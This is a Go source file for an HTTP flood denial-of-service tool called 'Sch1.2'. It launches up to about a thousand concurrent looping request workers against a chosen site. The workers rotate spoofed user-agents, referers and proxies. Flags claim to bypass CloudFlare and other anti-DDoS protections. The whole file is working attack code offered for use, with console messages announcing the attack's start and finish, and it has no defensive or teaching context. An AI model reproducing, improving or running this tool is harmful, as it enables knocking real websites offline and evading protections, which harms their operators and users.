package main

import (
	"bufio"
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync/atomic"
	"syscall"
	"time"
)

const __version__ = "1.2.0"

const acceptCharset = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"

const (
	callGotOk              uint8 = iota
	callExitOnErr
	callExitOnTooManyFiles
	targetComplete
)

var (
	safe            bool
	headersReferers []string = []string{
		"http://www.google.com/?q=",
		"http://www.usatoday.com/search/results?q=",
		"http://engadget.search.aol.com/search?q=",
		"http://bing.com/?q=",
	}
	headersUseragents []string
	cur              int32
	proxies          []string
)

func init() {
	headersUseragents = []string{
		"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Vivaldi/1.3.501.6",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169",
        "Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120",
        "Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90",
        "Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19577",
        "Mozilla/5.0 (X11) AppleWebKit/62.41 (KHTML, like Gecko) Edge/17.10859 Safari/452.6",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931",
        "Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
        "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.9200",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
        "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
        "Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
        "Mozilla/5.0 (Linux; U; Android 2.3; en-us) AppleWebKit/999+ (KHTML, like Gecko) Safari/999.9",
        "Mozilla/5.0 (Linux; U; Android 2.3.5; zh-cn; HTC_IncredibleS_S710e Build/GRJ90) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
        "Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
        "Mozilla/5.0 (Linux; U; Android 2.3.4; fr-fr; HTC Desire Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
        "Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; T-Mobile myTouch 3G Slide Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
        "Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
        "Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari",
        "Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
        "Mozilla/5.0 (Linux; U; Android 2.3.3; ko-kr; LG-LU3000 Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
        "Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
        "Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile",
        "Mozilla/5.0 (Linux; U; Android 2.3.3; de-de; HTC Desire Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
        "Mozilla/5.0 (Linux; U; Android 2.3.3; de-ch; HTC Desire Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
        "Mozilla/5.0 (Linux; U; Android 2.2; fr-lu; HTC Legend Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
        "Mozilla/5.0 (Linux; U; Android 2.2; en-sa; HTC_DesireHD_A9191 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
        "Mozilla/5.0 (Linux; U; Android 2.2.1; fr-fr; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
        "Mozilla/5.0 (Linux; U; Android 2.2.1; en-gb; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
        "Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
	}
}

func getRandomUserAgent() string {
	return headersUseragents[rand.Intn(len(headersUseragents))]
}

func rateLimit(interval time.Duration) {
	time.Sleep(interval)
}

func main() {
	var (
		version bool
		site    string
		agents  string
		data    string
		proxy   string
		headers arrayFlags
		heta     bool
		hetb     bool
		hetc     bool
		hetd     bool

	)

	flag.BoolVar(&version, "version", false, "Made by MosesAlfred :D version 1.2")
	flag.BoolVar(&safe, "safe", false, "Autoshut after dos.")
	flag.StringVar(&site, "site", "http://localhost", "Destination site.")
	flag.StringVar(&agents, "agents", "", "Get the list of user-agent lines from a file. By default the predefined list of useragents used.")
	flag.StringVar(&data, "data", "", "Data to POST. If present, Sch1.2 will use POST requests instead of GET")
	flag.StringVar(&proxy, "proxy", "", "File with list of proxy servers to use.")
	flag.Var(&headers, "header", "Add headers to the request. Can be used multiple times")
	flag.BoolVar(&heta, "heta", false, "CloudFlare Bypass")
	flag.BoolVar(&hetb, "hetb", false, "CloudFlare Under Attack Mode Bypass")
	flag.BoolVar(&hetc, "hetc", false, "Bypass Normal AntiDDoS.")
	flag.BoolVar(&hetd, "hetd", false, "The main one ;)")
	flag.Parse()

	t := os.Getenv("SCH1MAXPROCS")
	maxproc, err := strconv.Atoi(t)
	if err != nil {
		maxproc = 1023
	}

	u, err := url.Parse(site)
	if err != nil {
		fmt.Println("Error parsing URL parameter")
		os.Exit(1)
	}

	if version {
		fmt.Println("Sch1.2", __version__)
		os.Exit(0)
	}

	if agents != "" {
		if data, err := ioutil.ReadFile(agents); err == nil {
			headersUseragents = []string{}
			for _, a := range strings.Split(string(data), "\n") {
				if strings.TrimSpace(a) == "" {
					continue
				}
				headersUseragents = append(headersUseragents, a)
			}
		} else {
			fmt.Printf("Can't load User-Agent list from %s\n", agents)
			os.Exit(1)
		}
	}

	if proxy != "" {
		file, err := os.Open(proxy)
		if err != nil {
			fmt.Println("Error opening proxy file:", err)
			os.Exit(1)
		}
		defer file.Close()

		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			proxies = append(proxies, scanner.Text())
		}

		if err := scanner.Err(); err != nil {
			fmt.Println("Error reading proxy file:", err)
			os.Exit(1)
		}
	}

	go func() {
		fmt.Println("-- Sch1.2 Attack Started --\n           Go!\n\n")
		ss := make(chan uint8, 8)
		var (
			err, sent int32
		)
		fmt.Println("In use               |\tResp OK |\tGot err")
		for {
			if atomic.LoadInt32(&cur) < int32(maxproc-1) {
				if heta {
					go heta1(site, u.Host, data, headers, ss)
				} else if hetb {
					go hetb2(site, u.Host, data, headers, ss)
				} else if hetc {
					go hetc3(site, u.Host, data, headers, ss)
				} else if hetd {
					go hetd4(site, u.Host, data, headers, ss)
				
				} else {
					go httpcall(site, u.Host, data, headers, ss)
				}
			}
			if sent%10 == 0 {
				fmt.Printf("\r%6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
			}
			switch <-ss {
			case callExitOnErr:
				atomic.AddInt32(&cur, -1)
				err++
			case callExitOnTooManyFiles:
				atomic.AddInt32(&cur, -1)
				maxproc--
			case callGotOk:
				sent++
			case targetComplete:
				sent++
				fmt.Printf("\r%-6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
				fmt.Println("\r-- Sch1.2 Attack Finished --       \n\n\r")
				os.Exit(0)
			}
		}
	}()

	ctlc := make(chan os.Signal)
	signal.Notify(ctlc, syscall.SIGINT, syscall.SIGKILL, syscall.SIGTERM)
	<-ctlc
	fmt.Println("\r\n-- Interrupted by user --        \n")
}


func getRandomProxy(proxies []string) string {
    if len(proxies) > 0 {
        return proxies[rand.Intn(len(proxies))]
    }
    return "" // No proxy if the list is empty
}


func httpcall(requestURL string, host string, data string, headers arrayFlags, s chan uint8) {
	atomic.AddInt32(&cur, 1)

	for {
		q, err := http.NewRequest("GET", requestURL, nil)
		if err != nil {
			s <- callExitOnErr
			return
		}

		q.Header.Set("User-Agent", getRandomUserAgent())
		q.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))])

		for _, v := range headers {
			kv := strings.Split(v, ":")
			if len(kv) < 2 {
				continue
			}
			k := strings.TrimSpace(kv[0])
			v := strings.TrimSpace(kv[1])
			q.Header.Set(k, v)
		}

		for retries := 0; retries < 5; retries++ {
			resp, err := http.DefaultClient.Do(q)
			if err != nil {
				time.Sleep(time.Duration(1<<retries) * time.Millisecond)
				continue
			}
			defer resp.Body.Close()

			if resp.StatusCode >= 200 && resp.StatusCode < 300 {
				s <- callGotOk
			} else {
				s <- callExitOnErr
			}
			break
		}
		rateLimit(100 * time.Millisecond)
		atomic.AddInt32(&cur, -1)
	}
}




func heta1(requestURL string, host string, data string, headers arrayFlags, s chan uint8) {
	atomic.AddInt32(&cur, 1)

	for {
		// Reducing delay between requests
		time.Sleep(10 * time.Millisecond) // Send requests faster than the other attacks
		
		q, err := http.NewRequest("GET", requestURL, nil)
		if err != nil {
			s <- callExitOnErr
			return
		}

		q.Header.Set("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
		q.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))])
		q.Header.Set("Cache-Control", "no-cache")
		q.Header.Set("Accept-Encoding", "gzip, deflate")
		q.Header.Set("Pragma", "no-cache")
		q.Header.Set("DNT", "1")

		for _, v := range headers {
			kv := strings.Split(v, ":")
			if len(kv) < 2 {
				continue
			}
			k := strings.TrimSpace(kv[0])
			v := strings.TrimSpace(kv[1])
			q.Header.Set(k, v)
		}

		resp, err := http.DefaultClient.Do(q)
		if err != nil {
			s <- callExitOnErr
			return
		}
		defer resp.Body.Close()

		if resp.StatusCode >= 200 && resp.StatusCode < 300 {
			s <- callGotOk
		} else {
			s <- callExitOnErr
		}
	}
}

func hetb2(requestURL string, host string, data string, headers arrayFlags, s chan uint8) {
	atomic.AddInt32(&cur, 1)
	
	for {
		q, err := http.NewRequest("GET", requestURL, nil)
		if err != nil {
			s <- callExitOnErr
			return
		}

		q.Header.Set("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
		q.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))])
		q.Header.Set("Cache-Control", "no-cache")

		for _, v := range headers {
			kv := strings.Split(v, ":")
			if len(kv) < 2 {
				continue
			}
			k := strings.TrimSpace(kv[0])
			v := strings.TrimSpace(kv[1])
			q.Header.Set(k, v)
		}

		resp, err := http.DefaultClient.Do(q)
		if err != nil {
			s <- callExitOnErr
			return
		}
		defer resp.Body.Close()

		if resp.StatusCode >= 200 && resp.StatusCode < 300 {
			s <- callGotOk
		} else {
			s <- callExitOnErr
		}
	}
}

func hetc3(requestURL string, host string, data string, headers arrayFlags, s chan uint8) {
	atomic.AddInt32(&cur, 1)

	for {
		q, err := http.NewRequest("GET", requestURL, nil)
		if err != nil {
			s <- callExitOnErr
			return
		}

		q.Header.Set("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
		q.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))])
		q.Header.Set("Cache-Control", "no-cache")
		q.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
		q.Header.Set("Accept-Encoding", "gzip, deflate, sdch")

		for _, v := range headers {
			kv := strings.Split(v, ":")
			if len(kv) < 2 {
				continue
			}
			k := strings.TrimSpace(kv[0])
			v := strings.TrimSpace(kv[1])
			q.Header.Set(k, v)
		}

		resp, err := http.DefaultClient.Do(q)
		if err != nil {
			s <- callExitOnErr
			return
		}
		defer resp.Body.Close()

		if resp.StatusCode >= 200 && resp.StatusCode < 300 {
			s <- callGotOk
		} else {
			s <- callExitOnErr
		}
	}
}

func hetd4(requestURL string, host string, data string, headers arrayFlags, s chan uint8) {
    atomic.AddInt32(&cur, 1)

    for {
        time.Sleep(10 * time.Millisecond)

        // Pick a random proxy from the list
        proxyURL := getRandomProxy(proxies)
        proxy, err := url.Parse(proxyURL)
        if err != nil {
            s <- callExitOnErr
            return
        }

        // Set up an HTTP client with the proxy
        transport := &http.Transport{
            Proxy: http.ProxyURL(proxy),
        }
        client := &http.Client{Transport: transport}

        q, err := http.NewRequest("GET", requestURL, nil)
        if err != nil {
            s <- callExitOnErr
            return
        }

        q.Header.Set("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
        q.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))])
        q.Header.Set("Cache-Control", "no-cache")
        q.Header.Set("Accept-Encoding", "gzip, deflate")
        q.Header.Set("Pragma", "no-cache")
        q.Header.Set("DNT", "1")

        for _, v := range headers {
            kv := strings.Split(v, ":")
            if len(kv) < 2 {
                continue
            }
            k := strings.TrimSpace(kv[0])
            v := strings.TrimSpace(kv[1])
            q.Header.Set(k, v)
        }

        resp, err := client.Do(q) // Use custom client with proxy
        if err != nil {
            s <- callExitOnErr
            return
        }
        defer resp.Body.Close()

        if resp.StatusCode >= 200 && resp.StatusCode < 300 {
            s <- callGotOk
        } else {
            s <- callExitOnErr
        }
    }
}



func handleInterrupt() {
	ctlc := make(chan os.Signal)
	signal.Notify(ctlc, syscall.SIGINT, syscall.SIGKILL, syscall.SIGTERM)
	<-ctlc
	fmt.Println("\r\n-- Interrupted by user --        \n")
	os.Exit(0)
}


type arrayFlags []string

func (i *arrayFlags) String() string {
	return "arrayFlags"
}

func (i *arrayFlags) Set(value string) error {
	*i = append(*i, value)
	return nil
}